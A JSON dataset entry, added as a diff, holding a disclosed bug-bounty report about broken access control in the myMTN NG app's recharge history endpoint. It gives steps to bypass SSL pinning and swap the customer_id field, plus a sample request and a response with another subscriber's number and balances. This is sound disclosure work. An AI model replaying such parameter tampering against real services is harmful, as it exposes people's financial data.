@@ -1,0 +1,46 @@
+{
+    "reported_to": "MTN Group",
+    "reported_by": "hafiz-ng ",
+    "title": "Broken Access Control leads to disclosure of transaction history via /v2/rechargeTransactionHistory endpoint",
+    "content": "\nAn API endpoint discovered on the MyMTN NG mobile app fails to adequately enforce authorization and authentication mechanisms. Essentially, it allows a bad actor to access the transaction history details for other victims which include rechargeDate, amountAfter, amountBefore and transactionId due to an insufficient authorization check.\nSteps To Reproduce:\nLog into the myMTN NG mobile app.\nSet up your proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism.\nVisit the transaction history section within the app and intercept the request with your proxy tool.\nReplace the customer_id field to any arbitrary MTN number to disclose transaction details of the victim.\nSupporting Material/References:\n{\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588}\nRequest to vulnerable endpoint\nCode 376 Bytes\n1Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2Content-Type: application/json\n3Access-Control-Allow-Origin: *\n4Accept: application/json\n5Authorization: \u2588\u2588\u2588\u2588\u2588\u2588\n6X-Country-Code: nga\n7Msisdn-Code: 234\n8Accept-Encoding: gzip, deflate, br\n9Accept-Language: en-us\n10Content-Length: 77\n11User-Agent: myMTN%20NG/14 CFNetwork/1220.1 Darwin/20.3.0\n12\n13{\"customer_id\":\"2347032233323\",\"start_date\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"end_date\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\"}\nResponse\nCode 1.07 KiB\n1{\"sequenceNumber\":\"b5fb6af-bc59-57dd-a\",\"data\":[{\"rechargeDate\":\"\u2588\u2588\u2588\u2588\",\"amountAfter\":\"878190.940000\",\"adjustmentType\":\"RECHARGE\",\"amountBefore\":\"828190.940000\",\"subscriberId\":\"2347032233323\",\"rechargeHistory\":[{\"payType\":\"VTU\",\"rechargeAmount\":\"50000.0\",\"description\":\"VTU\"}],\"transaction\":\"VTU\"},{\"rechargeDate\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"amountAfter\":\"828190.940000\",\"adjustmentType\":\"RECHARGE\",\"amountBefore\":\"778190.940000\",\"subscriberId\":\"2347032233323\",\"rechargeHistory\":[{\"payType\":\"VTU\",\"rechargeAmount\":\"50000.0\",\"description\":\"VTU\"}],\"transaction\":\"VTU\"}],\"transaction\":\"VTU\"}],\"success\":true,\"resultCode\":\"0000\",\"links\":[],\"resultDescription\":\"Success\",\"transactionId\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588141033000481\",\"status\":200,\"statusCode\":200}```\n2\n3## Impact\n4\n5The potential impact this vulnerability may have on MTN NG can be summarized as follows:\n6\n7- The impact of this exposure of PII can be devastating to your company, with fallout ranging from recovery costs to decreased customer trust. \n8-  Attackers with access to this private information about a victim can use this information to carryout other nefarious activities.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1740945360,
+    "report_url": "https://hackerone.com/reports/2746709",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "API",
+    "steps": [
+        [
+            1,
+            "Log into the myMTN NG mobile app."
+        ],
+        [
+            2,
+            "Set up a proxy tool to intercept the mobile API traffic and bypass the SSL pinning mechanism."
+        ],
+        [
+            3,
+            "Visit the transaction history section within the app and intercept the request with the proxy tool."
+        ],
+        [
+            4,
+            "Replace the 'customer_id' field in the intercepted request with any arbitrary MTN number to disclose transaction details of another user."
+        ]
+    ],
+    "vuln_description": "The API endpoint '/v2/rechargeTransactionHistory' in the MyMTN NG mobile app fails to enforce proper authorization checks, allowing unauthorized access to transaction history details (rechargeDate, amountAfter, amountBefore, transactionId) of other users by simply modifying the 'customer_id' parameter in the request.",
+    "reason": "The vulnerability involves straightforward steps of intercepting and modifying a single API request. No complex interactions, state manipulations, or novel logic are required. The attack is simple and relies on a common authorization flaw.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
